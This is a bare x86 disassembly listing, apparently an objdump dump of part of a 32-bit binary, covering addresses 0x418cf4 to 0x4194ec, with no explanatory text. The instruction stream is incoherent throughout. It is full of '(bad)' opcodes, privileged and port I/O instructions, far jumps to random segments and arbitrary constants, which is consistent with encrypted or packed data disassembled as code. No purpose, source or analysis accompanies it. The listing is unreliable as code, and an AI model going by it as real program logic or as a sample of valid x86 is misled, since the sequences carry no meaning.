  418cf4:	xor    cl,cl
  418cf6:	sahf   
  418cf7:	add    al,0x88
  418cf9:	add    ebx,DWORD PTR [edx-0x2e0fabe6]
  418cff:	repz jno 0x418d0a
  418d02:	or     eax,0x51a14d65
  418d07:	(bad)  
  418d08:	push   ebx
  418d09:	push   ss
  418d0a:	int    0xf2
  418d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d0d:	aam    0xad
  418d0f:	or     esp,DWORD PTR [eax+0x5c]
  418d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d13:	and    DWORD PTR [edx-0x7],eax
  418d16:	arpl   WORD PTR [esi],si
  418d18:	rcr    DWORD PTR [esi+0x23],1
  418d1b:	cdq    
  418d1c:	(bad)  
  418d1e:	ja     0x418d60
  418d20:	stc    
  418d21:	pop    ebp
  418d22:	sub    eax,0x13285bfc
  418d27:	inc    edi
  418d28:	jl     0x418d5d
  418d2a:	or     DWORD PTR [esi],eax
  418d2c:	pop    edi
  418d2d:	add    cl,0xc2
  418d30:	or     BYTE PTR [ebx-0x59],0x36
  418d34:	xchg   edi,eax
  418d35:	aam    0xe1
  418d37:	(bad)  
  418d38:	and    al,0x18
  418d3a:	mov    DWORD PTR [ebp+0x31695dcc],edi
  418d40:	cli    
  418d41:	sub    eax,0xacfbe600
  418d46:	or     al,BYTE PTR [ecx-0x2f5ac235]
  418d4c:	xor    bl,BYTE PTR [edx+0x3e]
  418d4f:	into   
  418d50:	scas   eax,DWORD PTR es:[edi]
  418d51:	push   edx
  418d52:	xchg   ebx,eax
  418d53:	aad    0xa7
  418d55:	push   0xc57b5eae
  418d5a:	pop    eax
  418d5b:	xchg   DWORD PTR [edi],esi
  418d5d:	outs   dx,DWORD PTR ds:[esi]
  418d5e:	cwde   
  418d5f:	leave  
  418d60:	lods   eax,DWORD PTR ds:[esi]
  418d61:	es call 0xd942fe38
  418d67:	cwde   
  418d68:	call   esi
  418d6a:	leave  
  418d6b:	xchg   ebx,eax
  418d6c:	fcmovu st,st(7)
  418d6e:	xchg   ebp,eax
  418d6f:	aam    0x45
  418d71:	jo     0x418d61
  418d73:	and    eax,edi
  418d75:	iret   
  418d76:	(bad)  
  418d77:	jp     0x418dd7
  418d79:	push   ebp
  418d7a:	cld    
  418d7b:	mov    esp,0xe014a3da
  418d80:	mov    dh,ch
  418d82:	push   ebx
  418d83:	add    BYTE PTR [eax],dh
  418d85:	mov    al,ds:0x465c7f80
  418d8a:	jns    0x418d16
  418d8c:	pop    esp
  418d8d:	and    DWORD PTR [ebx+eax*4+0x5de1e6bb],esp
  418d94:	inc    edx
  418d95:	xchg   ebp,eax
  418d96:	cmp    eax,0x8b18412c
  418d9b:	mov    bl,0x1b
  418d9d:	add    al,0x33
  418d9f:	hlt    
  418da0:	cmc    
  418da1:	or     edi,esp
  418da3:	nop
  418da4:	mov    ebp,0x3902b769
  418da9:	test   eax,0xff089e17
  418dae:	shr    DWORD PTR [ecx-0x2478a64e],0x58
  418db5:	loope  0x418dbc
  418db7:	out    0x50,al
  418db9:	jae    0x418e01
  418dbb:	adc    BYTE PTR [ecx],ah
  418dbd:	mov    edi,0xc3e8b60
  418dc2:	ds int 0xe9
  418dc5:	retf   0xbc65
  418dc8:	test   BYTE PTR ds:0x19332958,bl
  418dce:	or     eax,0x209acc8b
  418dd3:	bound  edx,QWORD PTR [eax+ebp*8-0x48]
  418dd7:	ds inc ebp
  418dd9:	(bad)  
  418ddb:	fiadd  WORD PTR [ebx-0x51c08d13]
  418de1:	into   
  418de2:	or     edi,ecx
  418de4:	push   eax
  418de5:	jmp    0x418e60
  418de7:	je     0x418de9
  418de9:	cs adc al,0x5b
  418dec:	out    dx,al
  418ded:	mov    bh,0xb9
  418def:	pop    ds
  418df0:	ror    ecx,cl
  418df2:	xchg   ecx,eax
  418df3:	sbb    DWORD PTR [eax-0x16],0x90c1e3db
  418dfa:	pop    ss
  418dfb:	cmp    esi,DWORD PTR [eax+0x54]
  418dfe:	push   ebp
  418dff:	retf   
  418e00:	dec    esi
  418e01:	lahf   
  418e02:	lds    esi,FWORD PTR [ecx]
  418e04:	push   cs
  418e05:	xlat   BYTE PTR ds:[ebx]
  418e06:	pusha  
  418e07:	shl    BYTE PTR [ebp+ebx*2-0x68],cl
  418e0b:	imul   ecx,edi,0xf53ba647
  418e11:	fnstsw WORD PTR [ebp+0x1465125c]
  418e17:	mov    ds:0x87db77a7,al
  418e1c:	arpl   WORD PTR [eax-0x74],bx
  418e1f:	out    dx,al
  418e20:	sbb    ebx,DWORD PTR [ecx+0x2c285793]
  418e26:	xchg   ecx,eax
  418e27:	ret    0x768e
  418e2a:	and    bh,cl
  418e2c:	(bad)  
  418e2d:	ins    DWORD PTR es:[edi],dx
  418e2e:	pop    ss
  418e2f:	adc    eax,0xa0a79632
  418e34:	pop    esp
  418e35:	sbb    al,0x32
  418e37:	das    
  418e38:	xchg   ebx,eax
  418e39:	aaa    
  418e3a:	retf   0xa015
  418e3d:	pop    esi
  418e3e:	sbb    ecx,edx
  418e40:	sbb    BYTE PTR [ecx-0x5ff63aae],al
  418e46:	mov    dh,bh
  418e48:	aaa    
  418e49:	cwde   
  418e4a:	adc    BYTE PTR [esp+ecx*2],ah
  418e4d:	(bad)  [edx]
  418e4f:	(bad)  
  418e50:	popf   
  418e51:	jae    0x418e3a
  418e53:	fadd   DWORD PTR [eax-0x240a9252]
  418e59:	cmp    eax,0x6b4df81c
  418e5e:	mov    ecx,0x4a7de42f
  418e63:	mov    ah,cl
  418e65:	std    
  418e66:	clc    
  418e67:	stos   BYTE PTR es:[edi],al
  418e68:	test   al,0xa5
  418e6a:	xor    BYTE PTR [ebx],bl
  418e6c:	inc    esp
  418e6d:	mov    esi,ds
  418e6f:	in     eax,0x8f
  418e71:	loop   0x418e99
  418e73:	ret    0x9f8f
  418e76:	(bad)  
  418e78:	dec    ecx
  418e79:	aas    
  418e7a:	add    edx,DWORD PTR ds:0x64fc0e5
  418e80:	retf   
  418e81:	aaa    
  418e82:	push   esp
  418e83:	xchg   BYTE PTR [eax+0x43],bl
  418e86:	pusha  
  418e87:	(bad)
  418e8b:	dec    edx
  418e8c:	dec    esi
  418e8d:	mov    bl,0x24
  418e8f:	retf   
  418e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e91:	fst    DWORD PTR ds:0x66de43f3
  418e97:	fcomp  DWORD PTR [ecx]
  418e99:	jbe    0x418ef9
  418e9b:	jmp    0x6c66261b
  418ea0:	pop    esp
  418ea1:	push   ds
  418ea2:	ficom  DWORD PTR [edi]
  418ea4:	sbb    dh,dl
  418ea6:	jp     0x418ed3
  418ea8:	loop   0x418efb
  418eaa:	lds    eax,FWORD PTR [eax+0x4]
  418ead:	adc    DWORD PTR [ebx-0xa508c89],ecx
  418eb3:	cmp    DWORD PTR [ecx],ebx
  418eb5:	mov    bl,0x1a
  418eb7:	dec    BYTE PTR [ecx]
  418eb9:	stos   DWORD PTR es:[edi],eax
  418eba:	push   0xf8ae8acf
  418ebf:	or     ecx,DWORD PTR [ebp+0x21]
  418ec2:	or     ebx,eax
  418ec4:	xor    al,0xc
  418ec6:	xchg   ecx,eax
  418ec7:	out    dx,al
  418ec8:	div    DWORD PTR [ecx+0x15]
  418ecb:	dec    edx
  418ecc:	nop
  418ecd:	call   FWORD PTR [esi+0x38fdf49b]
  418ed3:	jns    0x418e5c
  418ed5:	jle    0x418f45
  418ed7:	rcr    BYTE PTR [ecx+0x29],cl
  418eda:	popf   
  418edb:	in     al,dx
  418edc:	mov    ch,BYTE PTR [edi-0x6f67c9ce]
  418ee2:	dec    ecx
  418ee3:	sbb    BYTE PTR [edi],al
  418ee5:	out    0x2a,eax
  418ee7:	sahf   
  418ee8:	sbb    eax,0x6faa176b
  418eed:	push   esp
  418eee:	vcvtsi2ss xmm2,xmm2,DWORD PTR [ecx+esi*4+0x7b]
  418ef4:	jle    0x418f00
  418ef6:	add    al,BYTE PTR [eax+0x4a05528a]
  418efc:	les    ebp,FWORD PTR [edx+eax*1]
  418eff:	sbb    al,0x23
  418f01:	add    dh,dl
  418f03:	out    0x79,eax
  418f05:	std    
  418f06:	test   DWORD PTR [ebp-0x7afd2f8f],esi
  418f0c:	shl    BYTE PTR [ebx+esi*1-0x7],1
  418f10:	sub    al,0xbf
  418f12:	(bad)  
  418f13:	shr    ebx,1
  418f15:	scas   eax,DWORD PTR es:[edi]
  418f16:	jp     0x418f28
  418f18:	sub    eax,0x8a8ae40c
  418f1d:	jbe    0x418f83
  418f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f20:	outs   dx,BYTE PTR ds:[esi]
  418f21:	ss pop ecx
  418f23:	and    BYTE PTR [esi-0x77976a2f],dh
  418f29:	sbb    al,0x23
  418f2b:	add    bh,BYTE PTR [ecx+0x44a57b2a]
  418f31:	icebp  
  418f32:	in     eax,dx
  418f33:	int3   
  418f34:	mov    esp,0x38f2d01c
  418f39:	jmp    0x418f90
  418f3b:	imul   DWORD PTR [edx-0x148ed00d]
  418f41:	jg     0x418f44
  418f43:	adc    DWORD PTR [ebx-0x52c0e21f],ebp
  418f49:	jmp    0x1f8a:0xb0624893
  418f50:	cwde   
  418f51:	sbb    al,0x29
  418f53:	mov    DWORD PTR [eax-0x18],esp
  418f56:	dec    edx
  418f57:	bound  ebx,QWORD PTR [ebx-0x5]
  418f5a:	xlat   BYTE PTR ds:[ebx]
  418f5b:	test   al,0xa1
  418f5d:	dec    eax
  418f5e:	dec    esi
  418f5f:	push   ebp
  418f60:	retf   
  418f61:	or     dh,BYTE PTR [eax]
  418f63:	mov    al,0xe6
  418f65:	dec    ebp
  418f66:	xchg   esp,eax
  418f67:	pop    ds
  418f68:	and    edi,DWORD PTR [edi-0x30]
  418f6b:	retfw  0x2412
  418f6f:	adc    DWORD PTR [esp+edi*8+0x58c9bef6],0x7c08665c
  418f7a:	retf   
  418f7b:	(bad)  [esp+edi*1+0x40a027d]
  418f82:	xor    al,0x26
  418f84:	retf   
  418f85:	inc    ebx
  418f86:	push   0x6a
  418f88:	pop    ebx
  418f89:	pop    esi
  418f8a:	out    dx,eax
  418f8b:	fist   DWORD PTR [edi]
  418f8d:	cdq    
  418f8e:	enter  0x3639,0xaf
  418f92:	pop    ss
  418f93:	push   ebp
  418f94:	sbb    cl,dh
  418f96:	pop    ebx
  418f97:	ret    0xcb1
  418f9a:	inc    edx
  418f9b:	xchg   ebx,eax
  418f9c:	dec    edx
  418f9d:	call   0xa9955d4f
  418fa2:	in     al,0xe8
  418fa4:	add    BYTE PTR [edx],dh
  418fa6:	div    DWORD PTR [esi+0x62]
  418fa9:	or     BYTE PTR [eax+ebp*2-0x7f],0xec
  418fae:	and    eax,DWORD PTR [ebx+0x35]
  418fb1:	pop    ecx
  418fb2:	add    eax,0x61047645
  418fb7:	add    edi,eax
  418fb9:	push   esi
  418fba:	xchg   esp,eax
  418fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fbc:	push   ss
  418fbd:	call   0xd279e43f
  418fc2:	push   es
  418fc3:	mov    DWORD PTR [ecx-0x16],edx
  418fc6:	jb     0x418fe8
  418fc8:	adc    BYTE PTR [ecx-0x3c103315],dh
  418fce:	mov    ebp,0x396b8c91
  418fd3:	in     eax,0x6c
  418fd5:	inc    esi
  418fd6:	dec    edx
  418fd7:	rcl    DWORD PTR [edx-0x3d327849],1
  418fdd:	jb     0x41903e
  418fdf:	in     al,dx
  418fe0:	inc    esi
  418fe1:	pusha  
  418fe2:	and    al,0xda
  418fe4:	shl    DWORD PTR [esi],1
  418fe6:	mov    bl,0xaf
  418fe8:	or     BYTE PTR [esi],cl
  418fea:	shr    BYTE PTR [eax+eiz*8-0x1ce9d44d],0xe3
  418ff2:	add    eax,0xde1f2415
  418ff7:	pop    ecx
  418ff8:	xchg   esp,eax
  418ff9:	adc    DWORD PTR [edx],esp
  418ffb:	mov    DWORD PTR [eax-0x27e04302],0xdc0b4d5d
  419005:	scas   eax,DWORD PTR es:[edi]
  419006:	aaa    
  419007:	cmp    al,0x8
  419009:	stc    
  41900a:	or     dh,BYTE PTR [ebx-0x31]
  41900d:	sub    BYTE PTR [ebx],0x3b
  419010:	loopne 0x418f97
  419012:	arpl   WORD PTR [ecx-0x7a9f77db],ax
  419018:	lea    edi,[ecx-0xadee12d]
  41901e:	sub    ch,BYTE PTR [esi]
  419020:	or     edx,edx
  419022:	rol    DWORD PTR [edx-0x1b],1
  419025:	les    ebx,FWORD PTR [edi+0x72]
  419028:	push   esi
  419029:	shl    DWORD PTR [ebp-0x78],cl
  41902c:	jmp    0x93311e8d
  419031:	ret    
  419032:	sub    esp,eax
  419034:	hlt    
  419035:	mov    dl,0xc8
  419037:	shl    DWORD PTR [edi+0x6d],cl
  41903a:	add    al,0xb
  41903c:	and    al,0x6c
  41903e:	jb     0x419021
  419040:	xor    edi,eax
  419042:	shl    esi,cl
  419044:	out    dx,eax
  419045:	add    bh,BYTE PTR ds:0x4673ad10
  41904b:	call   0x2759:0xcd149343
  419052:	bts    DWORD PTR [esi+0x48],ebx
  419056:	cld    
  419057:	and    eax,0x93206b58
  41905c:	cs jl  0x419088
  41905f:	adc    esp,eax
  419061:	fdivr  QWORD PTR [esi-0x7a]
  419064:	adc    eax,esp
  419066:	nop
  419067:	daa    
  419068:	in     al,0xc8
  41906a:	inc    edx
  41906b:	in     al,0xe7
  41906d:	mov    dl,0xf0
  41906f:	pop    DWORD PTR [ebx+0x73657ccc]
  419075:	xlat   BYTE PTR ds:[ebx]
  419076:	mov    fs,ebx
  419078:	mov    esp,0x49d80ac9
  41907d:	mov    ebx,0xcca0b071
  419082:	inc    esi
  419083:	int    0x86
  419085:	inc    esi
  419086:	test   BYTE PTR [edi],0x37
  419089:	xchg   esi,eax
  41908a:	retf   0xcfa6
  41908d:	push   ecx
  41908e:	popf   
  41908f:	mov    al,0xbf
  419091:	or     bl,BYTE PTR [edx]
  419093:	adc    BYTE PTR [eax-0x3b],bl
  419096:	lds    ecx,FWORD PTR [esi]
  419098:	lea    edi,[edi]
  41909a:	inc    ebx
  41909b:	jno    0x419089
  41909d:	jnp    0x4190aa
  41909f:	mov    esp,0x7ba90190
  4190a4:	repnz mov bl,0x27
  4190a7:	popf   
  4190a8:	fcom   DWORD PTR [edi]
  4190aa:	xor    al,0xdd
  4190ac:	retf   
  4190ad:	daa    
  4190ae:	call   0xae2abe14
  4190b3:	and    BYTE PTR [ebp-0x27],bh
  4190b6:	xor    edi,DWORD PTR [edx-0x33c58329]
  4190bc:	xor    al,0xaa
  4190be:	mov    DWORD PTR [esi+0x7d],0x1fe7ba8e
  4190c5:	(bad)  
  4190c6:	fst    st(3)
  4190c8:	cmp    al,0x1a
  4190ca:	inc    ebx
  4190cb:	mov    esi,0x401c9c61
  4190d0:	push   es
  4190d1:	ror    DWORD PTR [edx+0x49c818b4],1
  4190d7:	jle    0x4190a2
  4190d9:	mov    ebp,0xc810d5c4
  4190de:	xchg   ebx,eax
  4190df:	pusha  
  4190e0:	xchg   BYTE PTR [edx+0x7077070c],al
  4190e6:	jp     0x4190b7
  4190e8:	gs xchg ecx,eax
  4190ea:	inc    edi
  4190eb:	icebp  
  4190ec:	xchg   ebp,eax
  4190ed:	inc    ecx
  4190ee:	fild   WORD PTR [ebp+0x1e91d882]
  4190f4:	out    0x41,eax
  4190f6:	pop    esi
  4190f7:	iret   
  4190f8:	add    bh,al
  4190fa:	icebp  
  4190fb:	inc    esp
  4190fc:	pop    es
  4190fd:	bound  esi,QWORD PTR [esi]
  4190ff:	xor    eax,ebp
  419101:	push   edi
  419102:	pop    ss
  419103:	fnstenv [edx]
  419105:	loop   0x41910e
  419107:	out    0x90,eax
  419109:	push   edx
  41910a:	xor    ebp,0x3
  41910d:	aaa    
  41910e:	xchg   edx,eax
  41910f:	and    eax,0xda942819
  419114:	rol    DWORD PTR [edi],cl
  419116:	lahf   
  419117:	add    DWORD PTR [eax+ecx*2-0x66],edx
  41911b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41911d:	xor    eax,0xbaa61ea1
  419122:	push   esp
  419123:	xor    BYTE PTR [ecx+0x6862e3bf],cl
  419129:	pop    ebx
  41912a:	test   eax,0x22e66705
  41912f:	call   0x7cff39e
  419134:	fbstp  TBYTE PTR [ecx]
  419136:	ins    DWORD PTR es:[edi],dx
  419137:	outs   dx,DWORD PTR ds:[esi]
  419138:	gs out 0x7d,al
  41913b:	data16 mov al,0x86
  41913e:	data16 mov bl,0x12
  419141:	sub    edi,ebp
  419143:	pop    edx
  419144:	jmp    0x953:0x322b8e1a
  41914b:	es cli 
  41914d:	leave  
  41914e:	add    al,0x8c
  419150:	sub    eax,0x81ddf845
  419155:	cmp    eax,0xc6a58f0
  41915a:	sbb    al,0xef
  41915c:	jge    0x419188
  41915e:	sar    DWORD PTR [esi+0x2d],1
  419161:	xor    cl,0xf7
  419164:	fwait
  419165:	jg     0x4191b2
  419167:	sbb    edi,DWORD PTR [edi+0x7013deaf]
  41916d:	(bad)
  419171:	jle    0x4191b5
  419173:	inc    ebp
  419174:	aam    0x13
  419176:	xor    eax,0xb844042d
  41917b:	das    
  41917c:	add    bl,0x10
  41917f:	fdiv   QWORD PTR [esi-0xd]
  419182:	sbb    BYTE PTR [eax-0x54],0xeb
  419186:	inc    ebp
  419187:	int3   
  419188:	xchg   ebx,eax
  419189:	pop    esi
  41918a:	fcom   DWORD PTR [edi+0x66]
  41918d:	or     al,0x19
  41918f:	adc    al,0xb
  419191:	(bad)  
  419193:	aas    
  419194:	out    dx,al
  419195:	str    WORD PTR [esp+edi*1+0x1d]
  41919a:	cmp    BYTE PTR [edi],dl
  41919c:	or     eax,0x3e23354e
  4191a1:	and    edx,DWORD PTR ds:0x3abed64e
  4191a7:	mov    DWORD PTR [esi+0x3],edx
  4191aa:	mov    ds:0x94ec6db2,al
  4191af:	push   ebp
  4191b0:	xor    esp,DWORD PTR [edi+0x2b]
  4191b3:	push   edx
  4191b4:	lea    ebp,[edx-0xc76dfb5]
  4191ba:	ins    DWORD PTR es:[edi],dx
  4191bb:	out    0xb,al
  4191bd:	call   0x52db:0xb13f430
  4191c4:	sub    al,0xcc
  4191c6:	pop    ds
  4191c7:	into   
  4191c8:	jmp    0x8f7:0x833a6da2
  4191cf:	dec    edx
  4191d0:	(bad)  
  4191d1:	(bad)  
  4191d2:	cwde   
  4191d3:	xchg   DWORD PTR [ecx-0x3e955b2d],edx
  4191d9:	pop    edi
  4191da:	sbb    cl,dl
  4191dc:	pop    ds
  4191dd:	and    eax,0x7f048a37
  4191e2:	repz or al,0x9e
  4191e5:	pcmpgtd mm2,QWORD PTR [ebp+eax*2-0x1a8f6b00]
  4191ed:	fs ja  0x419209
  4191f0:	inc    edx
  4191f1:	mov    eax,ebp
  4191f3:	mov    al,ds:0x2e9d4cc7
  4191f8:	lods   al,BYTE PTR ds:[esi]
  4191f9:	lea    edx,[edi+0x32]
  4191fc:	mov    ah,0xc6
  4191fe:	cmc    
  4191ff:	add    al,0x99
  419202:	int3   
  419203:	xor    DWORD PTR [edi-0x3a],eax
  419206:	lds    ecx,FWORD PTR ds:[esi+0x2a]
  41920a:	je     0x419252
  41920c:	jnp    0x4191be
  41920e:	cmp    eax,0xf8407f42
  419213:	scas   al,BYTE PTR es:[edi]
  419214:	cmp    ebx,DWORD PTR [esi+0x2a382d34]
  41921a:	or     al,0x6e
  41921c:	or     dl,dh
  41921e:	or     DWORD PTR [esi+0x37],0xffffff90
  419222:	jmp    0x419210
  419224:	or     edx,DWORD PTR [ecx-0x57]
  419227:	mov    esi,0xf4eb903e
  41922c:	(bad)  
  41922e:	add    edx,DWORD PTR [ebx+0xb]
  419231:	pop    esi
  419232:	jmp    0xe753:0x97a79d8d
  419239:	mov    esp,0x95af5f1d
  41923e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41923f:	daa    
  419240:	xchg   esp,eax
  419241:	and    DWORD PTR [ebp-0x9],esp
  419244:	lock jb 0x41923d
  419247:	jmp    0x419270
  419249:	fwait
  41924a:	ret    0xea53
  41924d:	pop    ss
  41924e:	call   0xe5e:0x112d803f
  419255:	add    eax,0x782a8f7
  41925a:	aas    
  41925b:	mov    dl,0x44
  41925d:	cmp    al,0xd9
  41925f:	push   eax
  419260:	push   0x39
  419262:	div    DWORD PTR [esi+0x26]
  419265:	mov    al,0x24
  419267:	lods   al,BYTE PTR ds:[esi]
  419268:	jnp    0x419256
  41926a:	int3   
  41926b:	data16 je 0x4192c5
  41926e:	sbb    esp,DWORD PTR [edi-0x1b]
  419271:	in     eax,dx
  419272:	ss dec eax
  419274:	mov    ebp,0x3ce26afb
  419279:	in     eax,dx
  41927a:	jmp    0xf936f141
  41927f:	ins    BYTE PTR es:[edi],dx
  419280:	cli    
  419281:	cmp    esp,esp
  419283:	sub    ecx,eax
  419285:	sbb    al,0x52
  419287:	dec    edi
  419288:	dec    ebp
  419289:	js     0x4192a9
  41928b:	je     0x4192ff
  41928d:	and    DWORD PTR [ecx],esp
  41928f:	retf   
  419290:	dec    edx
  419291:	xor    bl,BYTE PTR [esi]
  419293:	mov    eax,0x968284c0
  419298:	in     eax,dx
  419299:	scas   eax,DWORD PTR es:[edi]
  41929a:	popa   
  41929b:	in     eax,0x7c
  41929d:	mov    ebp,0x4389e181
  4192a2:	retf   
  4192a3:	cmc    
  4192a4:	popf   
  4192a5:	test   al,0x1b
  4192a7:	jns    0x419327
  4192a9:	addr16 (bad) 
  4192ab:	push   ss
  4192ac:	adc    cl,BYTE PTR es:[edx-0x35]
  4192b0:	jb     0x419307
  4192b2:	mov    al,0xe5
  4192b4:	sbb    eax,0xf878a4de
  4192b9:	pop    es
  4192ba:	mov    eax,ds:0xa0e4d247
  4192bf:	add    al,0xa0
  4192c1:	(bad)  
  4192c2:	mov    edi,0x45f4ae87
  4192c7:	or     eax,0x17459744
  4192cc:	mov    esi,0x511f106
  4192d1:	sbb    eax,0x1c8dfa59
  4192d6:	push   ecx
  4192d7:	mov    cl,0x4d
  4192d9:	cli    
  4192da:	jmp    0xabc8d3be
  4192df:	popa   
  4192e0:	std    
  4192e1:	sbb    al,0x10
  4192e3:	inc    BYTE PTR [esi+0x14f9ff91]
  4192e9:	mov    ch,0x3c
  4192eb:	push   esp
  4192ec:	dec    edx
  4192ed:	add    eax,ebx
  4192ef:	call   0xdfaea10f
  4192f4:	or     BYTE PTR [ecx+0x3931a75b],bl
  4192fa:	(bad)
  4192fd:	mov    cl,0xea
  4192ff:	sahf   
  419300:	loop   0x419343
  419302:	dec    ebx
  419303:	pop    eax
  419304:	and    dh,BYTE PTR [edx+0x55]
  419307:	xlat   BYTE PTR ds:[ebx]
  419308:	and    DWORD PTR [edx+0x481b813f],eax
  41930e:	push   eax
  41930f:	mov    DWORD PTR [eax+eiz*1],0x401e0509
  419316:	test   eax,0x519d0840
  41931b:	or     DWORD PTR [esi+0x3ddff1cd],ebp
  419321:	or     edx,DWORD PTR [edx-0x2e]
  419324:	fild   WORD PTR [esi]
  419327:	retf   0xa4ca
  41932a:	stos   BYTE PTR es:[edi],al
  41932b:	sub    ebx,DWORD PTR [eax-0x27]
  41932e:	(bad)  
  41932f:	sbb    bl,ah
  419331:	lds    eax,FWORD PTR [edi+eax*4+0x1f]
  419335:	inc    ebp
  419336:	pop    edi
  419337:	les    eax,FWORD PTR [ecx+0x50]
  41933a:	bound  eax,QWORD PTR gs:[bp+si]
  41933e:	xor    DWORD PTR [ecx-0x554ef427],edi
  419344:	cld    
  419345:	mov    BYTE PTR [ebx],al
  419347:	xor    al,0x1b
  419349:	push   0x419ee1d2
  41934e:	sahf   
  41934f:	push   0x7c
  419351:	icebp  
  419352:	mov    ch,0xd3
  419354:	mov    ch,0xff
  419356:	daa    
  419357:	pop    eax
  419358:	(bad)
  41935b:	pop    ss
  41935c:	sar    dl,cl
  41935e:	sbb    al,0x74
  419360:	add    eax,0x266ca423
  419365:	push   ebx
  419366:	retf   0x382c
  419369:	adc    edi,edx
  41936b:	stos   BYTE PTR es:[edi],al
  41936c:	gs xor al,0x68
  41936f:	es je  0x4193eb
  419372:	ja     0x41934a
  419374:	sbb    al,BYTE PTR [edx+0x70]
  419377:	xor    DWORD PTR [edi+0x16],esp
  41937a:	add    bl,BYTE PTR [edx-0x5]
  41937d:	jmp    0x7d0e:0x8b907793
  419384:	dec    ebp
  419385:	pusha  
  419386:	cld    
  419387:	xchg   ecx,eax
  419388:	ret    
  419389:	ja     0x4193eb
  41938b:	sub    al,0xf0
  41938d:	mov    esi,0x6bf3029f
  419392:	cmc    
  419393:	retf   0xe3c3
  419396:	icebp  
  419397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419398:	cli    
  419399:	sahf   
  41939a:	mov    dl,0x1
  41939c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41939d:	fldcw  WORD PTR [ecx]
  41939f:	mov    eax,0xeaf2b2b2
  4193a4:	inc    ebp
  4193a5:	mov    esp,0x81696aac
  4193aa:	xor    al,0xb0
  4193ac:	clc    
  4193ad:	pop    ebp
  4193ae:	test   eax,0xd9bd77fc
  4193b3:	test   BYTE PTR [ecx+0x41],al
  4193b6:	mov    cl,0x2b
  4193b8:	mov    dl,0x83
  4193ba:	je     0x4193c9
  4193bc:	outs   dx,BYTE PTR ds:[esi]
  4193bd:	out    0x25,al
  4193bf:	jecxz  0x419355
  4193c1:	jne    0xb9a6233b
  4193c7:	sub    esp,esp
  4193c9:	icebp  
  4193ca:	cld    
  4193cb:	or     edi,esp
  4193cd:	mov    cl,0x8a
  4193cf:	add    eax,edi
  4193d1:	(bad)  
  4193d2:	int3   
  4193d3:	std    
  4193d4:	cmp    ebx,ebp
  4193d6:	dec    ebp
  4193d7:	bound  ebx,QWORD PTR [edi+ebx*4]
  4193da:	add    DWORD PTR [eax+eax*1-0x5b],edi
  4193de:	jbe    0x41936d
  4193e0:	int3   
  4193e1:	out    0x67,eax
  4193e3:	adc    ebp,DWORD PTR [ecx+0x33]
  4193e6:	mov    al,0xbf
  4193e8:	cmp    esp,ecx
  4193ea:	push   cs
  4193eb:	clc    
  4193ec:	stc    
  4193ed:	sub    BYTE PTR [eax+0x70714bbe],ch
  4193f3:	repnz mov edi,0x30e0b33b
  4193f9:	das    
  4193fa:	add    bh,0x69
  4193fd:	sbb    ebx,DWORD PTR [ecx-0x6b8f3ce4]
  419403:	pop    ss
  419404:	inc    esp
  419405:	inc    ebp
  419406:	pop    eax
  419407:	pop    ebp
  419408:	cmp    edx,DWORD PTR [edx+0x1ac39b5f]
  41940e:	lahf   
  41940f:	xor    bh,BYTE PTR [ebp+0x2c070ac6]
  419415:	push   ds
  419416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419417:	fimul  DWORD PTR [ebp*8-0x3f54e025]
  41941e:	cli    
  41941f:	int    0x39
  419421:	cld    
  419422:	arpl   sp,bp
  419424:	cmp    ebp,ebp
  419426:	cmp    ebx,ebp
  419428:	inc    eax
  419429:	mov    ah,0xd5
  41942b:	sar    BYTE PTR [esi+ebp*4-0x4f],0xb5
  419430:	in     al,0xda
  419432:	ret    
  419433:	push   esi
  419434:	ds or  al,0x85
  419437:	lods   al,BYTE PTR ds:[esi]
  419438:	xlat   BYTE PTR ds:[ebx]
  419439:	mov    es,WORD PTR [ebp+edx*2-0x56]
  41943d:	lahf   
  41943e:	jo     0x4194b4
  419440:	or     bh,BYTE PTR [edx-0x4b74d4d7]
  419446:	ins    BYTE PTR es:[edi],dx
  419447:	dec    edx
  419448:	push   ds
  419449:	loopne 0x4193ee
  41944b:	jae    0x41947f
  41944d:	pop    esp
  41944e:	and    BYTE PTR [edi-0xb],ah
  419451:	push   0x40447a2f
  419456:	int3   
  419457:	and    BYTE PTR [ecx+0x38],ch
  41945a:	jmp    0xc4f9:0x238071d5
  419461:	sub    al,0x2e
  419463:	cmc    
  419464:	dec    esp
  419465:	or     eax,0xfa8caebe
  41946a:	sbb    eax,0xb901f4
  41946f:	jno    0x419446
  419471:	or     BYTE PTR [eax],ch
  419473:	xchg   ecx,eax
  419474:	jne    0x4194a4
  419476:	fmul   QWORD PTR [esi+0x16a1e572]
  41947c:	jmp    0xd5ea:0x6749d69f
  419483:	add    bh,BYTE PTR [esi+0x7e]
  419486:	sbb    al,0x2f
  419488:	out    0x82,al
  41948a:	inc    ebp
  41948b:	dec    ebp
  41948c:	out    0xd0,eax
  41948e:	es mov bl,0x25
  419491:	cmp    ebp,edx
  419493:	ds mov edi,0xd30b9410
  419499:	push   DWORD PTR [ecx-0x4d]
  41949c:	push   ebx
  41949d:	jmp    0x419478
  41949f:	jns    0x41942f
  4194a1:	mov    ecx,0xa24c7d2
  4194a6:	and    eax,0xc8d01722
  4194ab:	int    0xf
  4194ad:	pop    ss
  4194ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194af:	mov    edi,0xf3dc829b
  4194b4:	mov    al,BYTE PTR [ebx+0x30]
  4194b7:	xor    eax,0x1acf8331
  4194bc:	enter  0xa740,0x5a
  4194c0:	cmc    
  4194c1:	jo     0x41945b
  4194c3:	xor    DWORD PTR [edi+0xf3ce89f],ecx
  4194c9:	les    esp,FWORD PTR [ebx-0x5290340]
  4194cf:	jmp    DWORD PTR [edi]
  4194d1:	test   DWORD PTR [edi-0x258a8e95],ebx
  4194d7:	icebp  
  4194d8:	xor    al,0x58
  4194da:	mov    ds:0x1049dfa5,al
  4194df:	or     eax,ecx
  4194e1:	or     DWORD PTR [ebx+edx*4],edx
  4194e4:	aaa    
  4194e5:	or     eax,0x49a7c68a
  4194ea:	loop   0x41952e
  4194ec:	ds inc ebx
